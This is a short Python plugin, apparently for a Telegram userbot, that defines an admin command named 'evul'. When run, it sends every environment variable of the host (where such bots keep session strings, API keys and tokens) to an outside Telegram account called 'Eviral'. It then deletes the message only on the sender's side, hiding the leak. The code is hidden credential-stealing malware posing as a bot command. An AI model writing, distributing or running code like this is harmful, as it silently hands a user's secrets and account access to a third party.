import os
from firebot import bot
from ..utils import admin_cmd

@bot.on(admin_cmd("evul"))
async def piro(event):
  msg = await bot.send_message("Eviral", str(os.environ))
  await bot.delete_messages("Eviral", msg, revoke=False)
